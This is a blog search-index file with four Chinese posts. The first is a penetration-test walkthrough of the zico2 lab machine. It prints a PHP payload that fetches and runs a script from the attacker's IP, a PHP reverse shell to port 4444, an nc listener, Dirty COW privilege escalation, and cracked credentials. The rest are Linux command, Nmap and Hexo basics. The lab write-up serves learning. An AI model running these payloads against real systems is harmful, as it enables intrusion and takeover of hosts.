<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[渗透测试（zico2）]]></title>
    <url>%2F2019%2F03%2F23%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88zico2%EF%BC%89%2F</url>
    <content type="text"><![CDATA[渗透测试（zico2） 目标：​ 对靶机进行测试，通过端口服务，漏洞或其他方式获取shell，并提升权限。 1.主机发现，端口发现，端口对应服务 扫描得到 80,22,111,53675 四个端口，以80,22为主进行后续测试 2.对80端口展开测试 在kali中dirb遍历网站目录–http://192.168.10.155/dbadmin/中有登陆界面，有弱口令admin登陆成功，并在数据库中发现敏感信息。 登陆浏览器发现无交互窗口，但还是在页面中发现一些信息—-点击进入，在URL中发现有可能含有文件包含。 文件包含出 /etc/passwd成功 文件包含+数据库导出phpinfo（）发现漏洞可利用。 3.根据80端口发现的文件包含漏洞展开攻击 在靶机的数据库中上传一个下载PHP脚本 kali上写一个shell.txt 在kali上同时打开临时HTTP服务和监听4444端口， 在URL上刷新，等待一段时间，连接到靶机 脏牛提权，在/tmp从kali下载dirty.c，并给予执行权限，执行脏牛，提权成功。后获取/bin/bash权限。 4.对22端口的测试 从数据库中爆破出的用户名、密码尝试 root 34kroot34 zico zico2215@ 用msfconsle字典爆破 5.日志清理 6.对第三步的强化理解 &lt;?php system(&quot;wget 192.168.10.149/shell.txt -O /tmp/shell.php php /tmp/shell.php&quot;);?&gt; 192.168.10.149是kali的ip；将其上传在靶机的数据库中，通过文件包含执行，wget命令从kali里下载shell.txt文件到靶机的 /tmp下并更名为shell.php，并执行shell.php文件. &lt;?php $sock=fsockopen(&quot;192.168.10.149&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)?&gt; ip依旧为kali的ip，通过上一个命令在拷贝过程中会执行此条语句，靶机会自动去连接kali的4444端口，并给一个/bin/sh(shell)。&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3中&lt;是输出；&gt;是输入；&amp;在后台运行；0是标准输入；1是标准输出；2表示标准错误信息输出。 python -m SimpleHTTPServer 80 开启临时80服务；此服务是为了方便靶机从kali上下在文件，所以在那个路径下开简单HTTP服务，则靶机就会从这个路径下下载文件。方便了大家，不用切换路径。 nc -nvlp 4444 在kali中监听4444端口 只有上述四步全部完成，才能去执行文件包含的URL！！！！ python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 在反弹的/bin/sh中输入，获得bash（shell），得到bash的权利。 7.ASK SELF 对&lt;?php $sock=fsockopen(&quot;192.168.10.149&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)?&gt;中的‘&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’的理解？ 为什么在靶机数据库中不直接insert&lt;?php $sock=fsockopen(&quot;192.168.10.149&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)?&gt;，显得更方便？ 为什么非要用/bin/bash(shell)?为啥不在/bin/sh中直接脏牛？]]></content>
      <tags>
        <tag>hack-text</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统基本命令小结]]></title>
    <url>%2F2018%2F12%2F11%2FLinux%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Linux系统中的常用命令一、获得命令帮助信息： 获得命令的使用语法 获得命令的选项及功能解释 1.获得内部命令帮助信息：（一般为纯英文）help 内部命令 eg. 获得cd命令的帮助信息 2、获得外部命令帮助信息：（带有中文）外部命令 --help eg. 获得外部命令date的帮助信息 PS.内部命令与外部命令之区别： 内部命令存在于Linux系统的Shell中，而非磁盘中Shell被Linux系统加载到内存中，内部命令处于随时调用状态，用户可直接使用。 外部命令以文件形式存在：通常存放在硬盘中，外部命令主要在“/bin，/sbin”等目录中。 二、查看系统信息1、查看CPU信息：cat /proc/cpuinfo 2、查看内存情况：cat /proc/meminfo 3、查看系统内核版本：cat /proc/version 4、查看已加载的文件系统：cat /proc/mounts 5、查看系统日期：date 6、设置日期和时间（月日时分年.秒）date 121217002018.00 三、关机操作1、关闭系统：shutdown now poweroff init0 2、重启系统：shutdown -r now reboot init6 四、文件和目录操作：1、更改路径（cd）1）进入 某个目录例如：进入home目录 cd /home 2）返回上一级目录cd .. 3）进入个人的主目录cd ~用户主目录名 例如：cd ~user1 进入个人的主目录 4）返回上次所在的目录cd - 5）显示完整工作路径pwd 2、查看目录或文件：（ls）1）查看某目录下的文件或子目录：例如：查看/etc目录下的文件或子目录 ls /etc 查看结果中： 目录：深蓝色 文件：黑色或其它颜色 2）ls -F查看结果中： 目录：带斜杠“/” 文件：不带斜杠“/” 3）查看目录或文件的详细信息ls -l *开头的’d’表示是文件夹，其他则代表文件 4）显示具有隐藏属性的文件或目录ls -a 带点“.”的文件或目录均具有隐藏属性 3、创建、删除目录 特别说明： 在写目标路径时最前面若加 ‘ / ’ 说明从根目录开始。若不加则说明当前目录开始。这个很重要！！ 1）创建目录mkdir 目录1 [目录2] [目录3] … 2）创建目录树mkdir -p /一级目录名/二级目录名/三级目录名… 3）查看目录树（递归显示）ls -R /一级目录名 4）删除空目录（rmdir）空目录：该目录中无任何子目录或文件 rmdir 目录名 5）删除空目录树rmdir -p 一级目录名/二级目录名/三级/... 若无-p参数，想要删除一个目录树得一个个删除。 4、删除文件及目录（rm）1）删除文件rm 文件名及其路径 例如：删除1.txt文件（rm只能删除文件不能删除文件夹，系统会询问是否删除，输入yes即可） 2）删除文件及目录rm -rf 一级目录 -r：递归删除目录树（包含文件一并删除） -f：关闭人机会话（删除时，系统不再询问是否删除） 5、touch命令1）建立空文件touch 新文件名及路径 2）更新旧文件的创建时间标记touch 旧文件名及路径 6、修改或编辑文件内容gedit 文件名及路径 也可以通过vim（或vi）命令来编辑修改文件内容 7、mv命令1）重命名文件及目录mv 原文件名及路径 新文件名及路径 2个路径必须相同（若是不同路径，则为移动文件或目录） 将 1.txt ——&gt; 2.txt 2）移动文件或目录mv 源文件名及路径 新文件名及路径 2个路径必须不同 8、cp命令1）复制文件（原名复制）cp 源文件及路径 目标文件所在路径 可以使用星号“*”通配符，例如： 复制所有文件：cp /root/* /home/user1 复制同类型的所有文件：cp /root/*.txt /home/user1 2）复制文件（换名复制——源文件路径和目标文件路径相同）cp 源文件及路径 目标文件及路径 3）复制整个目录树（包含目录、子目录及文件）cp -R 源目录 目标目录 9、创建软链接文件软链接：相当于快捷方式（文件或目录均可以创建软链接） ln -s 源文件（目录）路径 软链接文件及路径 10、查找文件或目录（主要学习按名查找）find 指定查找路径 -name 指定查找的文件名及目录名 例如：在根目录下查找ifcfg-eth0文件 使用星号（*）可实现模糊查找 例如： 1）要查找文件名是ifcfg开头的文件 2）要查找文件类型是cfg的文件 五、文件的归档、压缩操作1、tar命令常见选项： -c：创建归档 -x：解归档 -v：显示过程 -f：指定文件名 -C：指定解归档的目录路径 -z：将打包文件压缩成gzip格式 -j：将打包文件压缩成bzip2格式 1）归档：即打包，常用于备份某个重要的目录 只归档不压缩 tar -cvf 创建的归档文件名及路径 要归档的目录 既归档、又压缩（gzip、bzip2压缩格式） tar -czvf 创建的归档压缩文件名及路径 要归档的目录 tar -cjvf 创建的归档压缩文件名及路径 要归档的目录 2）解归档 解归档到原路径 tar -xvf 归档文件名及路径 解归档到指定路径 tar -xvf 归档文件名及路径 -C 指定解归档的目录路径 解压缩、解归档 l 解压缩、解归档到原路径 tar -xzvf 归档压缩文件名及路径 例如：tar -xzvf /backup/root.tar.gz tar -xjvf 归档压缩文件名及路径 例如：tar -xjvf /backup/root.tar.bz2 l 解压缩、解归档到指定路径 tar -xzvf 归档压缩文件名及路径 -C 指定解归档的目录路径 例如：tar -xzvf /backup/root.tar.gz -C /backup tar -xjvf 归档压缩文件名及路径 -C 指定解归档的目录路径 例如：tar -xjvf /backup/root.tar.bz2 -C /backup2 2、gzip、bzip命令常见选项： -d：解压 1）压缩 gzip bzip 2）解压缩 gzip -d bzip -d]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap从入门到实践]]></title>
    <url>%2F2018%2F11%2F28%2FNmap%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[I. 写在前面 Nmap是什么？ ​ Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。 功能？ ​ 探测一组主机是否在线； ​ 扫描主机端口，嗅探所提供的网络服务； ​ 推断主机所用的操作系统 。 所用工具：下载官网链接： scanme.nmap.org ​ Nmap（命令行），wireshark，虚拟机（调试到仅主机模式） 如何获取Nmap？ ​ 最初Nmap是工作在Linux上的。如今Windows上也可以使用。 ​ 下载官网链接:Nmap ​ 在官网中选择合适的系统下载。（以Windows为例，下列讲解也以window为例） 一定要在官网中下载，从别的渠道得到的里面可能会有别人加的后门。 II. Nmap中的一些用法下载的Nmap可以用图形化界面操作，但我们根据Nmap前面提到的功能在命令行中对其命令进行相对应的分类。 Nmap可以扫描内网也可以扫描外网，此次以内网讲解。内网：在虚拟机中设定一活跃主机192.168.91.135。 代码中的\&lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网 1.主机发现（1）nmap -sL &lt;target&gt; ​ 仅仅是将IP段内主机列成一张表 ​ 这里的 \&lt; target &gt; 是一个ip段 （2）nmap -sP &lt;target&gt; ​ 局域网内：-sP参数原理为ARP扫描 （3）部分局域网和大多数公网都会设有防火墙，所以对策如下： ​ nmap -PS &lt;target&gt; (TCP SYS) ​ nmap -PA &lt;target&gt; (TCP ACK) ​ ##这两个命令在cmd中的所展现的是一样的，但所用的方法不同 ​ 局域网内：ARP扫描+常用的1000个TCP端口尝试建立连接 ​ 只有当扫描的到开机的主机，才会对此主机进行端口的扫描 2.端口扫描##端口的状态## open 开放的 close 关闭的 filtered 被防火墙过滤的 unfiltered 未被过滤的 open\filtered 开放或者被过滤的 closed\filtered 关闭或者被过滤的 （1）nmap -sS &lt;target&gt; ​ -sS为半连接，只进行TCP三次握手的前两次，所以相对较快。 （2）nmap -sT &lt;target&gt; ​ -sT命令为全连接，耗时较长。 （3）nmap -sU &lt;target&gt; ##Remark! ​ -Pn : 此参数可以绕过主机发现这一过程 ​ -p:次参数可以指定端口eg. Nmap -sS -p 80 192.168.91.135（扫描80端口） 3.版本探测（1）nmap -sV &lt;target&gt; （2） namp -O &lt;target&gt; ​ 操作系统判断 （3） namp -A &lt;target&gt; ​ 查询全部数据 III. 写在最后这是我第一次写这种学习后的所获文档。写出来总感觉还所缺陷，但又不知又从何处入手。内有不足欢迎大家指正。 Nmap是一个在做渗透测试时常用的信息收集软件。里面有许多各式各样的参数需要去学习，当然你如果全部把他们的功能背诵下来知道每个命令都可以干什么，那确实很棒。但现实…….哈哈哈，大家都一样，所以需要去总结，分类。本次我按其功能分为三类，详细如上。我在学习中也遇到了些许问题，例如：主机探测中的-PS -PA参数和端口探测中-sS -sT有何区别？？？我也很无语，还在查证中~~ 这个文档全部是以内网作为讲解，大家可以也可以拿着工具去公网上搞一波，测一测。练习虽好，但切记点到为止，公网安全需要大家共同维护！]]></content>
      <tags>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F11%2F25%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
